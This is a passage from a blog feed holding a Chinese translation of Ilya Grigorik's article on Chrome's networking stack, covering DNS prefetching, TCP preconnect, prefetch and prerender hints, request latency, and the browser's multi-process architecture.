<p>原本的实现的优点是，由于依赖操作系统，代码可以更简洁，并且还能利用上操作系统的DNS缓存。不过，<code>getaddrinfo()</code>是一个阻塞式的系统调用，这就意味着Chrome得创建并维护一个专有的线程池来进行并行的解析。<strong>这个线程池最大不超过6个worker线程</strong>，这是基于硬件最小公共分母的一个经验值，因为我们发现太高的并行请求会让一些用户的路由器过载！</p>
<p>对于使用worker池的预解析方案，Chrome就简单地调用<code>getaddrinfo()</code>，这会阻塞到response返回，在此之后他就丢弃了返回的结果并转而处理下一个请求。<em>丢弃它？</em>由于结果已经由系统DNS守护进程缓存了，这以后就能立即返回了。这足够简单和有效。</p>
<p><strong>嗯，很有效，但这还远远不够！</strong><code>getaddrinfo()</code>调用并不会告诉Chrome很多有用的信息，比如说每个记录的TTL，和DNS缓存自身的状态。为了提升性能，Chrome团队决定实现一个跨平台、异步的DNS解析器。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/xasync-dns.png" alt="xasync-dns"></p>
<p>Chrome自己进行DNS解析带来了以下的新优化：</p>
<ul>
<li>对于重传输计时器更好的控制，并且能并行多个查询</li>
<li>TTL信息可见，这让Chrome可以在失效之前就更新热门的记录</li>
<li>对于IPv4和IPv6更好的支持</li>
<li>基于RTT和其他信号转换去其他的服务器（DNS服务器）</li>
</ul>
<p>以上，乃至还有更多，都是来源于Chrome持续不断的实验和优化。一个更加明显的问题是：<em>我们是如何验证这些想法的效果的呢？</em>，这很简单，Chrome对于每个用户，都对网络性能进行了细致的追踪和记录。你可以打开<code>chrome://histograms/DNS</code>来查看这些信息。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/xdns-prefetch.png" alt="xdns-prefetch"></p>
<p>上图显示了DNS预请求的时间延时分布情况：差不多半成的（右栏）都是在20毫秒内完成的（左栏）。这是基于最近的一次浏览回话（9869条记录）并为用户私有。如果用户选择向Chrome提交他们的使用情况数据的话，这些数据才会被匿名化后，周期性地提交到开发团队，这样我们就能看到试验成功并不断做出调整了。就这样反复迭代更新。</p>
<h2 id="使用预连接来优化管理TCP连接">使用预连接来优化管理TCP连接</h2><p>既然我们通过Omnibox和Chrome预测器猜测出了接下来用户的导航方向，并预先解析出了域名，<strong>那为什么不再提前一步，预先与目标域名建立TCP连接，在用户发出真实的请求前就完成TCP握手呢？</strong>这样的话，我们便又节省了一个完整的Roundtrip时延，为用户节省了数百毫秒的延时。这便是TCP预连接和它的工作原理了。</p>
<p>首先，Chrome会先检查其socket池，找找有没有此域名的可用的socket。重用已经保持一段时间的keep-alive的sockets可以防止TCP握手和慢启动惩罚。如果没有可用的socket，那再启动TCP握手，并将它放到池中。这样的话，当用户启动导航的时候，真实的HTTP请求就能立即发送出去了。</p>
<p>打开<code>chrome://net-internals#sockets</code>来查看Chrome中打开的socket详情统计。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/xnetinternals-sockets.png" alt="xnetinternals-sockets"></p>
<p>你还可以深入每个socket的详情并审查时间线：连接和代理时间，每个包的到达时间等等。你还可以将数据导出，用于离线分析和bug报告。<strong>一个好审视(instrumentation)系统的是性能优化的关键，而<code>chrome://net-internals</code>是Chrome网络的汇总点</strong>，如果你还没尝试它的话快去试试吧。</p>
<h2 id="使用预加载提升来优化资源加载">使用预加载提升来优化资源加载</h2><p>有时，网页开发者基于站点的布局信息，可以提供附加的导航信息，或是page context(不知原文所指)。这能帮助浏览器优化用户体验。Chrome支持以下两种提示，内嵌在网页中即可：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"subresource"</span> href=<span class="string">"/javascript/myapp.js"</span>&gt;</span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"prefetch"</span>    href=<span class="string">"/images/big.jpeg"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>子资源和预加载看起来没有什么不同，但却有着非常不同的语义。当一个链接声明自己与当前网页的关系是”prefetch”的时候，这只是暗示浏览器它是一个可能在未来需要打开的页面。换句话说，它只是一个跨页面提示。对比来看，”subresource”提示浏览器本资源是可能会被用于当前页面的，这需要在遇到这个资源之前发出request。</p>
<p>如你所料，不同的语义也带来了资源加载器非常不同的行为。标注为prefetch的资源只是被赋予低优先级，只有在本页面结束加载后才会考虑。而subresource资源则一遇到就加载，优先级很高。</p>
<p>这两个提示，如果在合适的环境下正确使用，可以显著地优化你站点的用户体验。最后，要提示大家prefetch是<a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/links.html#link-type-prefetch" target="_blank" rel="external">HTML5标准的一部分</a>，现已经获得了Firefox和Chrome的支持，而subresource只是在Chrome中支持。（此信息可能已经过期）</p>
<h2 id="使用浏览器预刷新来优化资源加载">使用浏览器预刷新来优化资源加载</h2><p>不幸的是，不是所有的站点开发人员都可以或是愿意在网页标注出subresource。就算他们这么做了，我们必须等待HTML文档返回，才能解析到这些提示，并开始获取必要的subresource。这就要看服务器的响应时间，和延时了。通常数百甚至上千的延时都有可能出现。</p>
<p>但是，让我们眼光再放得长远一些，Chrome已经知道了热门资源的域名，并以此进行DNS的预解析。为什么我们不再向前推进一步，进行DNS查询，使用TCP预连接，并推测性地预先加载资源呢？这便是”预刷新”想做的。</p>
<ul>
<li>用户打开目标URL</li>
<li>Chrome查询预测器，得到和目标URL相关的子资源，并也开始DNS预解析-TCP预连接-资源预刷新</li>
<li>如果子资源已经缓存，那么只要从磁盘或是内存中加载就好</li>
<li>如果资源缺失，或是缓存到期，那么才发出网络请求</li>
</ul>
<p><img src="/images/high-perf-network-in-chrome-trans/xchrome-experiment.png" alt="xchrome-experiment"></p>
<p>资源预刷新是Chrome中性能优化的一个典型范例，理论上来说，它应该能带来更好的性能，不过这其中还是有很多折衷。只要一种方式来选择是否需要将这个功能融合入Chrome，就是实现它并在pre-release的Chrome中给实际用户、实际的网络和实际的浏览中进行A/B测试。</p>
<p>在2013年早期，Chrome团队就已经在讨论这一实现。如果收集的反馈好，我们就可以在2013年后期看到这一功能。<strong>提升Chrome网络性能的脚步从未停止，团队一直在尝试新的方法、想法和技术</strong>。</p>
<h2 id="使用预渲染优化浏览体验">使用预渲染优化浏览体验</h2><p>我们以上提及的每一个优化都减少了用户真实请求发出的时间，最终让页面得以渲染。但是，<strong>一个真实的秒开的体验还需要什么呢？</strong>基于我们之前预先看到的UX数据，互动必须在100ms中结束，这便不给网络延时留多少空余时间了，我们要怎样才能在100ms中渲染好一个页面呢？</p>
<p>当然，你应该已经猜到了答案。这通常是大多数人的习惯：如果你打开了很多网页，并在其中切换，这就是秒开的体验，可比等待加载快多了。如果浏览器已经为你提供了API来这么做呢？</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;<span class="keyword">link</span> rel=<span class="string">"prerender"</span> href=<span class="string">"http://example.org/index.html"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>你猜对了，这边是<a href="https://developers.google.com/chrome/whitepapers/prerender" target="_blank" rel="external">Chrome中的预渲染</a>。不像”prefetch”只是下载一个资源，”prerender”提示Chrome在加载其所有subresource后，在一个隐藏的标签页中渲染这个页面。<strong>隐藏的tab是不为用户所见的，但当用户触发导航的时候，此tab就被从后台交换出来，形成所谓的”秒开”</strong>。</p>
<p>你可以访问<a href="http://prerender-test.appspot.com/" target="_blank" rel="external">prerender-test.appspot.com</a>来体验一下，打开<code>chrome://net-internals/#prerender</code>来查看预渲染的历史和当前状态。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/xnetinternals-prerender.png" alt="xnetinternals-prerender.png"></p>
<p>如你所料，在后台tab中完整地渲染一个页面需要消耗大量的CPU和网络资源，因此我们只会在此页面非常可能用到的时候才会进行预渲染！比如之前提到的Omnibox的高可能性提示。相似的是，Google搜索有时也会为第一结果加入预渲染的提示（也称谓Google Instant Pages）。</p>
<p><a href="https://www.youtube.com/watch?v=_Jn93FDx9oI" target="_blank" rel="external">视频地址</a></p>
<p><strong>你也可以为你的网站添加预渲染的提示</strong>。不过，在你这么做之前，你需要知道预渲染由一些限制：</p>
<ul>
<li>在所有进程中，只允许一个预渲染的tab</li>
<li>不支持HTTPS和需要认证的HTTP页面</li>
<li>如果请求的资源，或其任何subresource需要进行一个非幂等(原文：nonidempotent)请求，（只允许GET）</li>
<li>所有的资源都是以最低网络优先级发出的</li>
<li>所有的页面都是以最低CPU优先级渲染的</li>
<li>如果页面使用超出100MB的内存，就会终止</li>
<li>推迟插件的初始化，如果存在HTML 5 媒体元素的话，也会终止</li>
</ul>
<p>换句话说，不能保证预渲染一定进行，并只在安全的情况下进行。还需提到的是，隐藏的页面也会执行Javascript和其他逻辑，最佳实践是利用<a href="https://developers.google.com/chrome/whitepapers/pagevisibility" target="_blank" rel="external">Page Visibility API</a>来检查页面是否可见，这也是你一定<a href="http://www.html5rocks.com/en/tutorials/pagevisibility/intro/" target="_blank" rel="external">会学的</a>。</p>
<h1 id="Chrome越用越快">Chrome越用越快</h1><p><img src="/images/high-perf-network-in-chrome-trans/xchrome-speed-final.png" alt="xchrome-speed-final"></p>
<p>现在看来，Chrome的网络栈可比一个朴素的socket管理器复杂多了。我们这个简短地介绍了在浏览网页时你不可见的很多优化。Chrome越是学习网络的拓扑和你的习惯，做得越好。<strong>这就好像魔术一样，Chrome是越用越快的，不过它不是魔法，因为你已经知道它的内部机理了</strong>。</p>
<p>最后，还是需要提到Chrome团队一直努力迭代和实验，来不断提高性能。在你读到这里的时候，还是由很多新实验和优化在开发、测试和部署中。兴许某一天，我们达到了我们秒开（小于100ms）的目标时，我们可以歇一歇脚，不过在那之前，还有很多路要走！</p>
<blockquote>
<p>Ilya Grigorik，Google Web性能工程师，W3C Web性能小组的co-chair，High Performance Browser Networking (O’Reilly) 一书的作者，<a href="https://twitter.com/igrigorik" target="_blank" rel="external">Twitter</a>,<a href="https://plus.google.com/+IlyaGrigorik" target="_blank" rel="external">Google+</a></p>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="你使用浏览器进行会话的全过程">你使用浏览器进行会话的全过程</h1><p>通过前文我们已经能在心中绘制出Chrome网络栈的大致图样，现在让我们来详细了解一下浏览器中一系列面向用户的优化。现在，让我们想想我们刚刚创建了一个Chrome的用户档案，并准备开始上网冲]]>
    </summary>
    
      <category term="browser" scheme="http://yqf3139.github.io/tags/browser/"/>
    
      <category term="chrome" scheme="http://yqf3139.github.io/tags/chrome/"/>
    
      <category term="network" scheme="http://yqf3139.github.io/tags/network/"/>
    
      <category term="trans" scheme="http://yqf3139.github.io/categories/trans/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Google Chrome 中的高性能网络技术实践（翻译）上]]></title>
    <link href="http://yqf3139.github.io/2015/12/13/high-perf-network-in-chrome-trans/"/>
    <id>http://yqf3139.github.io/2015/12/13/high-perf-network-in-chrome-trans/</id>
    <published>2015-12-13T02:54:59.000Z</published>
    <updated>2015-12-16T15:01:48.996Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>看到Ilya Grigorik写的<a href="https://www.igvita.com/posa/high-performance-networking-in-google-chrome/" target="_blank" rel="external">这篇高性能网络技术实践</a>后，一直想找个机会好好阅读一下。之前遇到英文文章的话我还是喜欢偷个懒，直接找中文版本。借这个机会，第一次体会翻译英文文章。<br>还发现了<a href="http://chimera.labs.oreilly.com/books/1230000000545/ch17.html#_deploying_websocket_infrastructure" target="_blank" rel="external">全书免费线上阅读</a>，准备细细地读一下。</p>
</blockquote>
<h1 id="Google_Chrome的历史和指南">Google Chrome的历史和指南</h1><p>在2008的下半年，Chrome的Beta版本的登陆Windows平台。于此同时，Google将Chrome的核心代码以BSD许可开源，并称其为Chromium。对于关注它的人来说，这一事件引发了一个惊喜的猜想：浏览器大战再燃？Google真的可以做得更好吗？</p>
<blockquote>
<p>它体验实在太好了，这让我改变了我最初的想法。<br>– Eric Schmidt, 最初他对开发Chrome是抱有<a href="http://blogs.wsj.com/digits/2009/07/09/sun-valley-schmidt-didnt-want-to-build-chrome-initially-he-says/" target="_blank" rel="external">抵触想法</a>的</p>
</blockquote>
<p>现在看来，Chrome团队做到了。现在Chrome是全球最广泛使用的浏览器之一（依据StatCounter的统计，超过<a href="http://gs.statcounter.com/?PHPSESSID=oc1i9oue7por39rmhqq2eouoh0" target="_blank" rel="external">35%</a>的市场占有率），并提供了Windows、Linux、OS X 桌面平台版本和Android、iOS移动平台版本。显然，解决了用户痛点的特性与功能，和众多的创新点让Chrome跻身流行浏览器排行。</p>
<p>这本<a href="http://www.google.com/googlebooks/chrome/" target="_blank" rel="external">38页的漫画书</a>详细阐述了Chrome中创新的想法，这提供了一个绝佳的视角，供大家学习开发Chrome过程中思考和设计过程。不过这仅仅只是开始。驱动Chrome开发的核心原则并未改变，依旧是现在Chrome优化的指南：</p>
<ul>
<li><code>速度(Speed)</code>     ：目标就是要做出<strong>最快</strong>的浏览器</li>
<li><code>安全(Security)</code>  ：为用户提供<strong>最安全</strong>的使用环境</li>
<li><code>稳定(Stability)</code> ：提供<strong>稳定而有弹性</strong>的Web应用平台</li>
<li><code>简洁(Simplicity)</code>：用复杂的技术驱动起上层<strong>简单的用户体验</strong></li>
</ul>
<p>据团队观察，很多我们现在使用的网站不是简简单单的网页了，而是应用。这样看来，越来越多野心勃勃的应用都把速度、安全、稳定和简洁作为追求，而对于每一个最求，都需要单独成文来说，本文的主题是高性能，所以主要讨论速度。</p>
<h1 id="从多个方面来看高性能">从多个方面来看高性能</h1><p>现代浏览器是一个平台，就像操作系统一样，Chrome就是照此标准设计的。在Chrome之前，所有主流的浏览器都是单进程应用。所有打开的网页共用一个内存区域，并相互争夺共享的资源。任何页面中或是浏览器中的Bug，都带来了牺牲全局体验的风险。</p>
<p>而Chrome另辟蹊径，工作在一个多进程的模式下。它提供了进程和内存隔离，并将每一个页面运行在<a href="http://dev.chromium.org/developers/design-documents/sandbox" target="_blank" rel="external">安全的沙箱</a>环境中。在目前多核处理器流行的背景下，隔离进程和保护页面不受恶意网页攻击被证明是Chrome在激烈竞争中的很好抓手。值得注意的是，很多浏览器也迁移到了这一多进程的架构，或是正在迁移之中。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/comic-multi-process.png" alt="comic-multi-process"></p>
<p>在多进程环境启动后，Web应用的执行主要包含一下三个任务：获取资源、页面布局与渲染、Javascript执行。渲染和脚本执行依照一个单线程、交叉执行的模型——这是由于不能对DOM进行并发修改，这也是Javascript自身单线程的特性造成的。因此，对于Web应用开发者和浏览器开发者，怎样在运行时协同优化渲染和脚本执行是关键一环。</p>
<p>Chrome使用<a href="http://www.chromium.org/blink" target="_blank" rel="external">Blink</a>作为渲染引擎，它也是为速度而生，是一个开源的、标准支持良好的布局引擎。对于Javascript，Chrome推出了精心优化过的Javascript运行环境，<a href="http://en.wikipedia.org/wiki/V8_(JavaScript_engine" target="_blank" rel="external">V8</a>)，V8也独立作为项目开源，得到了广泛的使用，例如它也是Node.js的运行环境。<strong>不过，如果是浏览器阻塞在网络IO上，针对V8虚拟机优化，或者是对Blink解析和渲染流水线的优化不会产生很好的效果，因为大部分时间还是消耗在了等待网络资源上</strong>。</p>
<p>总用户体验中的最关键因素之一，便是浏览器优化各种网络资源的加载顺序、优先级和延时的能力。你可能都注意不到它，但Chrome的网络栈便是每天逐步演化得更加聪明。它尝试隐去或是降低各种资源加载带来的时延：预先加载最可能的DNS查询、记住网络的拓扑结构、向可能的目标提前发起连接等等。从使用者的角度来看，它只是一个简单的资源加载工具，而从内部来看，它相当精巧和迷人地示范了怎样进行网络性能调优，以及如何带给用户最好的使用体验。</p>
<p>那就让我们一探究竟吧。</p>
<h1 id="现代的Web应用是怎样的？">现代的Web应用是怎样的？</h1><p>在我们接触如何对网络进行优化的技术细节之前，理解Web发展潮流和我们需要面对的问题会有所帮助。<strong>一个现代的Web页面，或者是一个Web应用究竟是怎样的？</strong></p>
<p><a href="http://httparchive.org/" target="_blank" rel="external">HTTPArchive</a>项目追踪着互联网是如何构建的，它能帮我们回答这些问题。它周期性地爬取最流行的站点，对它们使用的资源数量、文件类型、headers和各种元数据进行记录和聚合分析，而并不关注站点的内容数据。2013年一月的数据可能会让你惊讶，在最流行的300,000个站点中，平均下来一个网页的数据如下：</p>
<p><img src="/images/high-perf-network-in-chrome-trans/httparchive-jan2013.png" alt="httparchive-jan2013"></p>
<ul>
<li>大小约为<strong>1280KB</strong></li>
<li>共计<strong>88个资源文件</strong></li>
<li>共连接了超过<strong>15个独立的主机</strong></li>
</ul>
<p>让我们细细分析一下。平均大于1MB的数据传输，包含88个资源文件如图片、Javascript和CSS，并是从15个独立的主机或第三方主机加载而来！这些数字在过去几年中都在<a href="http://httparchive.org/trends.php" target="_blank" rel="external">稳定增长</a>，现在看来没有减缓停止的趋势。这说明我们在不断开发更大的Web应用。</p>
<p>稍加计算我们发现资源的平均大小是12KB（1045KB/84），这说明<strong>浏览器中大多数的网络传输是短小猝发的</strong>。因为使用的底层协议(TCP)是专为较大和流式文件传输优化的，这就带来了一系列并发问题。让我们逐步剥开一个网络Request看看。</p>
<h1 id="一个Request的一生">一个Request的一生</h1><p>W3C <a href="http://www.w3.org/TR/navigation-timing/" target="_blank" rel="external">Navigation Timing specification</a>提供了一个浏览器API来展示每一次Request的性能数据。让我们详细观察这些组成部分，因为它们都是优化的用户体验的一个重要组成部分。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/request-life.png" alt="request-life"></p>
<p>给定一个网络资源的URL，浏览器从检查本地caches开始。如果之前已经加载过这份资源并且<a href="https://developers.google.com/speed/docs/best-practices/caching" target="_blank" rel="external">和cache控制相关的headers</a>已经被设置(<em>比如Expires, Cache-Control</em>)，接着便可使用本地的拷贝来回应这个Request-<strong>最快的Request便是不产生真实的Request</strong>。有时文件过期，我们需要重新让这个文件具有最新的时效，或是之前没有加载过它，那么一个网络Request必须被发出，不过这是代价高昂的。</p>
<p>给定一个Hostname和Resource Path，Chrome先检查是否有打开的连接可以被重用，Sockets以{scheme, host, port}的三元组被池化使用。如果Proxy被设置，或是使用了一个自动Proxy设置脚本(PAC)，Chrome会通过合适的Proxy检测连接。PAC脚本允许针对URL路由不同的Proxy，这每一套规则都有其自己的Socket池。最终，如果以上条件都不满足，那么<strong>这个Request必须首先将主机名解析为IP地址，即DNS查询开始</strong>。</p>
<p>如果幸运的话，这个Hostname已经被查询过并被缓存，那么我们距离Response就只有一个系统调用的距离了。不是这样的话，那么DNS查询必须完成，之后其他工作才能继续开展。DNS查询的时间依据网络提供商的不同，可能差距很大，比如网站的流行度和本Hostname在中间DNS服务器缓存的可能性，还有对应域名服务器的响应时间，都会影响这一时间消耗。换句话说便是变数很多，而且要知道一个<em>数百毫秒</em>的DNS查询也不是不常见，真是肉疼。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/three-way-handshake.png" alt="three-way-handshake"></p>
<p>解析好的IP地址到手后，Chrome便可向目标打开一个新的TCP连接，这需要经过<a href="http://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_establishment" target="_blank" rel="external">三次握手</a>：<code>SYN &gt; SYN-ARK &gt; ACK</code>。这次数据交换<strong>让每个新的TCP连接都背负了一个完整的Roundtrip时延</strong>，似乎没有捷径可走。依据客户端和服务端的距离与选择的路由路径，这可造成十至百，乃至上千毫秒的延时。这些工作都是在一个有效的Request数据传输前需要消耗的！</p>
<p>一旦TCP握手完成，如果我们是用HTTPS协议建立连接的话，SSL握手又将开始。这又将<strong>增加两个Roundtrip时延</strong>，如果SSL回话被缓存，那么我们可以开心地节省一次Roundtrip。</p>
<p>终于，Chrome可以发送HTTP Request（上图<code>requestStart</code>标识）。服务器收到回复后便处理Request并发送Response。这造成了一个Roundtrip，并加上服务器的处理时间。似乎我们终于结束了，不过如果如果返回了HTTP Redirect，我们还需要再重走一遍。所以如果你服务器上有好几个Redirect，最好优化一下这个实现。</p>
<p>你是不是已经开始计算总的延时了呢？我们在特定的带宽情况下来假设一个延时最大的情况，本地缓存失效，立刻执行一个较快的DNS查询（50ms），TCP握手，SSL握手和一个相对较快的服务器响应时间（100ms），并设定Roundtrip时间为80ms（一个跨越美洲的平均时间）。</p>
<ul>
<li>50ms DNS查询</li>
<li>80ms TCP握手，（一次RTT）</li>
<li>160ms SSL握手，（两次RTT）</li>
<li>40ms 发送请求给服务器</li>
<li>100ms 服务器处理请求</li>
<li>40ms 服务器返回结果</li>
</ul>
<p>本单次Request总计470毫秒，<strong>其中和真正的服务器处理请求的时间想比，80%的时间消耗在了网络延时上</strong>。我们得做点什么！事实上，470毫秒已经是一个乐观的估计了：</p>
<ul>
<li>如果服务器的响应不能被装入一个最先的TCP<a href="http://en.wikipedia.org/wiki/Transmission_Control_Protocol#Congestion_control" target="_blank" rel="external">拥塞窗口</a> （4-15 KB），那么需要继续加上一个或多个Roundtrip延时。</li>
<li>如果我们需要加载一个缺失的证书，或是进行一个<a href="http://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol" target="_blank" rel="external">在线证书状态检查</a>（OCSP），SSL延时可能会更长。可能会增加数百上千的毫秒延时。</li>
</ul>
<h1 id="怎样算是“足够快”？">怎样算是“足够快”？</h1><p>在我们之前的例子中，由于DNS、握手和Roundtrip造成的延时是影响总延时的大头，其中服务器造成的延时只有区区20%。但是，<strong>从更加宏观的角度来看，这个延时有造成影响吗</strong>？在读本文的你可能已经知道了答案：对，影响很大。</p>
<p>之前的<a href="http://www.useit.com/papers/responsetime.html" target="_blank" rel="external">用户体验调查</a>展示了我们作为用户，对各种应用响应程度的需求：</p>
<table>
<thead>
<tr>
<th style="text-align:center">延时</th>
<th style="text-align:center">用户反馈</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0 - 100ms</td>
<td style="text-align:center">秒开啊</td>
</tr>
<tr>
<td style="text-align:center">100 - 300ms</td>
<td style="text-align:center">似乎顿了一下</td>
</tr>
<tr>
<td style="text-align:center">300 - 1000ms</td>
<td style="text-align:center">好吧还好不是死机</td>
</tr>
<tr>
<td style="text-align:center">1s+</td>
<td style="text-align:center">我刚才想干什么来着</td>
</tr>
<tr>
<td style="text-align:center">10s+</td>
<td style="text-align:center">容我去睡一会</td>
</tr>
</tbody>
</table>
<p>上表也解释了Web性能社区的一个不成文的规定：渲染页面，或者至少在250ms内提供视觉反馈，来保持用户的注意力。这不能算是从源头上提高了速度。Google、Amazon、Microsoft等千家网站都发现额外的延时对网站有着直接影响：<code>更快的网站意味着更多的PV，更高的参与度和更高的转化率</code>。</p>
<p>说到这你应该明白了，我们优化目标是250ms，而上述DNS查询，TCP/SSL握手和Request传输时间加在一起足足由370ms，我们已经超了50%的时间，并且我们甚至还没有考虑服务器的时间消耗！</p>
<p>对于绝大多数用户，甚至开发者而言，DNS、TCP和SSL延时都是完全透明的，并且是在网络层进行的，我们便较少深入和思考。但这些步骤却对总体用户体验有着极大的影响，因为这都可能带来十或百的毫秒延时。<strong>这就是为什么Chrome的网络栈比一个简单的Socket处理程序复杂很多的原因</strong>。</p>
<p><em>现在我们已经认清了问题所在，让我们深入实现细节看看</em>。</p>
<h1 id="从10,000英尺高度鸟瞰Chrome的网络栈">从10,000英尺高度鸟瞰Chrome的网络栈</h1><h2 id="多进程架构">多进程架构</h2><p>Chrome的多进程架构明显地暗示了在浏览器中一个网络Request是如何处理的。在底层，Chrome实际上支持<a href="http://www.chromium.org/developers/design-documents/process-models" target="_blank" rel="external">四种不同的执行模型</a>来确定使用哪一种进程分配模型。</p>
<p>默认情况下，桌面版的Chrome使用Process-per-site模型，这将不同网站隔离开来，并将同一网站的所有实例都组在一个进程中。不过，为了更加方便大家理解，让我们假设这样一个简单的情况：对于每一个打开的tab，都分配一个独立的进程。从网络性能角度来考虑，区别不是很大，但Process-per-tab的模型更加容易理解。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/process-model.png" alt="process-model"></p>
<p>这一架构下，每一个<strong>渲染进程</strong>都对应与一个tab，其中都运行着开源Blink布局引擎，它是解释和进行HTML布局的（也就是图中的“HTML Renderer”），还运行着V8 Javascript虚拟机、桥接这两个引擎的代码和一些其他组件。如果你感兴趣的话，可以查看Chromium wiki中的<a href="http://www.chromium.org/developers/design-documents/multi-process-architecture" target="_blank" rel="external">介绍</a>。</p>
<p>每一个这些“render”进程都在沙盒环境下执行，这保证它们对用户电脑的访问受限，当然也包含了网络。为了获取这些资源，每一个render进程和Browser主进程进行通信，这就可以为每一个render加上安全的访问策略。</p>
<h2 id="进程内通信（IPC）和多进程资源加载">进程内通信（IPC）和多进程资源加载</h2><p>在Render和Browser进程间的所有通信都是通过IPC完成的。在Linux和OS X中，一个<code>socketpair()</code>用来提供一个异步的、有标识的管道传输。每个来自render的消息都被序列化后，传递给一个专用的I/O线程，由I/O线程再向Browser进程分发。在接收端，Browser进程提供一个过滤器接口，这运行Chrome对资源IPC请求进行拦截处理（查看<a href="http://code.google.com/p/chromium/source/search?q=resourcemessagefilter&amp;origq=resourcemessagefilter&amp;btnG=Search+Trunk" target="_blank" rel="external">ResourceMessageFilter</a>），转交给网络栈进行处理。</p>
<p><img src="/images/high-perf-network-in-chrome-trans/network-stack.png" alt="network-stack"></p>
<p>一个本架构的好处是<code>所有的资源Request都在I/O线程上处理，所以任何UI触发的活动或是网络事件会不相互干涉</code>。资源过滤器在Browser进程的I/O线程中执行，拦截资源Request消息，并将它们转发给Browser进程中的<a href="http://code.google.com/searchframe#OAMlx_jo-ck/src/content/public/browser/resource_dispatcher_host.h&amp;exact_package=chromium&amp;q=ResourceDispatcherHost" target="_blank" rel="external">ResourceDispatcherHost</a>单实例对象。</p>
<p>单实例接口下，浏览器可控制每个render对网络的访问，这也让一个高效和一致的资源共享机制成为可能。</p>
<ul>
<li><strong>Socket池和连接数限制</strong>：浏览器可限制打开的sockets数量，默认为256每个profile，32每个Proxy，和6每个<code>{scheme, host, port}</code>三元组。这表明同时最大可以允许6个HTTP和6个HTTPS连接到同一个<code>{host, port}</code>！</li>
<li><strong>Socket重用</strong>：TCP连接在为某Request服务后可以不断开，被保存在Socket池中以重用，这也就避免了附加的DNS，TCP和SSL(如果需要的话)重新建立带来的开销。</li>
<li><strong>Socket后期绑定</strong>：Requests只有在socket可以传输应用的Request的时候，才和一个底层的TCP连接绑定，这样便可更好进行Request的优先级调度（例如在socket建立连接的时候，产生了更高优先级的Request），更好的吞吐（比如在打开新的连接的时候，已有的socket变为可用状态，便可以重复使用“热”的TCP连接）。同时还有TCP预连接和一系列的其他优化。</li>
<li><strong>持续的会话状态</strong>：验证，Cookies和缓存数据可以在所有的render进程间共享。</li>
<li><strong>全局资源和网络优化</strong>：可以基于所有的请求进行决策，比如说，给予前台tab的网络请求更高的优先级。</li>
<li><strong>基于预测的优化</strong>：通过观察所有的网络流量，Chrome可以建立并改善预测模型来提升性能。</li>
<li><em>还有很多</em></li>
</ul>
<p>对于render进程来说，它需要做的仅仅是用一个独特的Request ID来标记一个Request请求消息，并通过IPC发送出去，然后一切交由Browser进程接手。</p>
<h2 id="跨平台的资源获取">跨平台的资源获取</h2><p><img src="/images/high-perf-network-in-chrome-trans/cross-platform.webp" alt="cross-platform"></p>
<p>在实现Chrome的网络栈中，其中一个主要的关注点便是在多个平台间的可移植性：Linux, Windows, OS X, Chrome OS, Android, 和iOS。为了应对这一挑战，<code>网络栈被实现为通常单线程工作（有分离的缓存和代理线程）的，跨平台的库</code>，这使Chrome可重用相同的基础代码，并提供相同的性能优化，这也是跨平台优化的绝佳机会。</p>
<p>所有相关的网络的代码，都开源在<a href="https://code.google.com/p/chromium/codesearch#chromium/src/net/&amp;ct=rc&amp;cd=1&amp;q=src.net&amp;sq=package:chromium" target="_blank" rel="external">src/net 子目录</a>。在这我们不会详细讨论所有的模块，但你能从代码的布局看出它的结构和可以跨越的平台。举个例子：</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">net/android</td>
<td style="text-align:left">Android运行时的绑定</td>
</tr>
<tr>
<td style="text-align:center">net/base</td>
<td style="text-align:left">通用网络工具库，例如域名解析，cookies，网络环境变动侦测，SSL证书管理</td>
</tr>
<tr>
<td style="text-align:center">net/cookies</td>
<td style="text-align:left">HTTP cookies的存储、管理和获取的实现</td>
</tr>
<tr>
<td style="text-align:center">net/disk-cache</td>
<td style="text-align:left">网络资源的磁盘和内存的缓存实现</td>
</tr>
<tr>
<td style="text-align:center">net/dns</td>
<td style="text-align:left">一个异步DNS解析器的实现</td>
</tr>
<tr>
<td style="text-align:center">net/http</td>
<td style="text-align:left">HTTP协议的实现</td>
</tr>
<tr>
<td style="text-align:center">net/proxy</td>
<td style="text-align:left">代理（Socks和HTTP）配置，解析，脚本获取等等</td>
</tr>
<tr>
<td style="text-align:center">net/socket</td>
<td style="text-align:left">跨平台的TCP sockets实现，SSL流和Socket池</td>
</tr>
<tr>
<td style="text-align:center">net/spdy</td>
<td style="text-align:left">SPDY协议实现</td>
</tr>
<tr>
<td style="text-align:center">net/uri_request</td>
<td style="text-align:left">URLRequest, URLRequestContext, and URLRequestJob的实现</td>
</tr>
<tr>
<td style="text-align:center">net/websocket</td>
<td style="text-align:left">Websockets协议实现</td>
</tr>
</tbody>
</table>
<p>以上每一个子模块都适合好奇的你阅读，代码文档齐全，并且你会找到不少单元测试。</p>
